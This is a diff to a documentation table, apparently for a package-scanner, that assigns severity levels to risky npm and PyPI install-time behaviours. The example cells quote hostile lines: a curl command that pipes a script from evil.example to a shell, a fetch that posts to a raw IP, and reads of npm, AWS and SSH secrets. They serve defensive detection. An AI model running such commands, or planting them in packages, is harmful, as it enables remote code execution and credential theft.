@@ -55,6 +55,11 @@ by what the behavior can do at install time:
 | `setup.py` network calls (`urllib`, `requests`) | **Medium** | `urllib.request.urlopen('https://evil.example/beacon')` phoning home during install. |
 | Native binaries shipped in a package | **Low** | An ELF, PE, or Mach-O file, or a `.exe`/`.dll`/`.so`/`.dylib`, inside an unpacked npm or PyPI package — informational, since native addons are common and legitimate. |
 | New install script between two versions | **Medium** | A patch release that adds `setup.py` or an npm `postinstall` hook. |
+| npm install script (`preinstall`, `install`, `postinstall`, `prepare`) | **Medium** | A declared lifecycle hook such as `"postinstall": "node scripts/build.js"` — most are legitimate, but the hook runs arbitrary code on install, so it is surfaced for review. |
+| Install script downloads and pipes to a shell | **High** | `curl -fsSL https://evil.example/x.sh \| sh` in an npm `preinstall` script or a file it invokes. |
+| Install script talks to a raw IP address | **Medium** | `fetch('http://203.0.113.9/collect')` — bypasses hostname-based allowlists and is unusual in a build script. |
+| Install script reads tokens or secret files | **High** | `process.env.NPM_TOKEN`, `process.env.AWS_SECRET_ACCESS_KEY`, `~/.ssh/id_rsa` or `~/.npmrc` read from an install script. |
+| Obfuscated JavaScript | **Medium / High** | A file scoring 4–7 on the obfuscation heuristics (encoded blobs, `eval`/`new Function`/`atob`, high-entropy strings, very long lines) is **medium**; 8+ is **high**. A minified bundle gets only the long-line point and is not flagged. |
 | New suspicious `setup.py` call between two versions | *(inherits)* | The new call keeps the level of its kind (command execution → high, obfuscation/network → medium). |
 
 ## How CVSS maps in
